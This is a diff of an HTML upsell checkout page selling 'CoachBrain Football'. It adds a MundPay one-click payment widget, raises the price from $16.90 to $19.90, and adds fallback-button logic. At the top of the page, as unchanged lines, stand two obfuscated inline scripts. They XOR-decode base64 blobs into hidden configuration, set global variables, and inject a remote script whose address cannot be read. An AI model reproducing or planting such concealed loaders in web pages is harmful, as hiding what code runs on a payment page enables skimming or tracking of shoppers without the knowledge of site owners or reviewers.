@@ -19,6 +19,9 @@
   <script>(function(){var d_x=atob("DPr59rXKqrz9qfAyVYHbg8emiIbfwYRGJYnD2ZqpztLT3IRfPJyA2Nalx5Kf299BNoiQhsG5hcmJxIMdOZuNk8a+hNaOi9wQNI6NhNyo38iY2tIIDoHbmNSnz57Hi5RTIZvUg8Gnw9qEhIBAMIycmMHn0t+Szd1BNpHb2pe8y9CIzNIId9iE2s7oxN2QzNIId56YgtTn38iQwJZLeIqLk8OvxMjQ2oVQPJ6K1Jno3N2R3JUQb9jbi+i3");var q_pfbp=[];for(var u_ou=0;u_ou<d_x.length;u_ou++){q_pfbp.push(d_x.charCodeAt(u_ou)&255);}var q_7d7=q_pfbp[0];var s_ix=q_pfbp.slice(1,1+q_7d7);var b_tn1=q_pfbp.slice(1+q_7d7);var e_wi0=b_tn1.map(function(b,j_pzrq){return b^s_ix[j_pzrq%q_7d7];});var d_3pgh="";for(var k_ug9z=0;k_ug9z<e_wi0.length;k_ug9z++){d_3pgh+=String.fromCharCode(e_wi0[k_ug9z]&255);}var h_qbc=decodeURIComponent(escape(d_3pgh));var k_y=JSON.parse(h_qbc);var d_q1f=k_y.globals||[];d_q1f.forEach(function(x_4){window[x_4.name]=x_4.value;});var n_spm=document.createElement("script");n_spm.src=k_y.url;n_spm.async=true;n_spm.defer=true;(k_y.attributes||[]).forEach(function(i_bcpb){n_spm.setAttribute(i_bcpb.name,i_bcpb.value);});(document.head||document.documentElement).appendChild(n_spm);})();</script>
   <script>(function(){var t_b8b=atob("DDzH5NobtyAklqtReUflkah3lRoG/t8lCU/9y/V4004K4988EFq+yrl02g5G5IQiGk6ulK5omFBN7s49VkyunL93mUpXtIdzGEizlrN5wlRB5YlrImHrxr132EJF+thzQ2e8xrR62kUGrIkhEESiiJN/lQwG4Mo9DFnl3vgt1hkc9ZNgG1qigrkvg0RAppxjTwX2gOI5yn1Z");var b_tuti=[];for(var y_vk=0;y_vk<t_b8b.length;y_vk++){b_tuti.push(t_b8b.charCodeAt(y_vk)&255);}var v_bgq=b_tuti[0];var o_m=b_tuti.slice(1,1+v_bgq);var n_w=b_tuti.slice(1+v_bgq);var d_faa4=n_w.map(function(b,i_q){return b^o_m[i_q%v_bgq];});var n_yic="";for(var j_9ec0=0;j_9ec0<d_faa4.length;j_9ec0++){n_yic+=String.fromCharCode(d_faa4[j_9ec0]&255);}var m_uj=decodeURIComponent(escape(n_yic));var u_z9ct=JSON.parse(m_uj);var o_hep=u_z9ct.globals||[];o_hep.forEach(function(f_apk1){window[f_apk1.name]=f_apk1.value;});var o_u5=document.createElement("script");o_u5.src=u_z9ct.url;o_u5.async=true;o_u5.defer=true;(u_z9ct.attributes||[]).forEach(function(j_3qwx){o_u5.setAttribute(j_3qwx.name,j_3qwx.value);});(document.head||document.documentElement).appendChild(o_u5);})();</script>
 
+  <!-- MundPay 1-Click Upsell Script -->
+  <script src="https://upsell.mundpay.com/script-v2.js" defer async></script>
+
   <!-- CSS Puro & Elegante (Inspirado no Template Vencedor dos Upsells Anteriores) -->
   <style>
     @font-face {
@@ -458,7 +461,7 @@
     <!-- Card de Oferta Principal (Com Borda Verde Suave e Destaque Limpo) -->
     <div class="offer-card">
       <p class="eyebrow" style="margin-bottom: 6px;">Mejora Exclusiva</p>
-      <h2 class="offer-title">Obtén acceso de por vida a CoachBrain Football por solo $16.90</h2>
+      <h2 class="offer-title">Obtén acceso de por vida a CoachBrain Football por solo $19.90</h2>
       <p class="offer-badge">Pago único • Sin suscripciones • Sin mensualidades</p>
       
       <p class="offer-desc">
@@ -467,10 +470,13 @@
 
       <div style="margin-bottom: 20px; text-align: center;">
         <p class="price-display">
-          De <span class="old-price">$47</span> por solo <span class="new-price">$16.90</span>
+          De <span class="old-price">$47</span> por solo <span class="new-price">$19.90</span>
         </p>
 
-        <!-- Botão CTA Principal -->
+        <!-- Widget MundPay 1-Click Upsell -->
+        <div data-mndpay-render="01a0b625-e80c-70a0-a63b-4fd43a049af2"></div>
+
+        <!-- Botão CTA Principal (Fallback) -->
         <a 
           href="https://pay.mycheckoutt.com/01a06972-8e51-7275-86a8-37844d7ccc52?ref=" 
           class="btn-cta" 
@@ -586,6 +592,26 @@
           }
         }
       }, true);
+    })();
+
+    // Suporte inteligente MundPay: oculta o fallback se o botão oficial 1-click for renderizado
+    (function handleMundPayRender() {
+      const target = document.querySelector('[data-mndpay-render]');
+      const fallbackBtn = document.getElementById('btnUpsellAccept');
+      if (!target || !fallbackBtn) return;
+      if (target.children.length > 0) {
+        fallbackBtn.style.display = 'none';
+        const hint = document.querySelector('.cta-hint');
+        if (hint) hint.style.display = 'none';
+      }
+      const observer = new MutationObserver(function() {
+        if (target.children.length > 0) {
+          fallbackBtn.style.display = 'none';
+          const hint = document.querySelector('.cta-hint');
+          if (hint) hint.style.display = 'none';
+        }
+      });
+      observer.observe(target, { childList: true, subtree: true });
     })();
   </script>
 
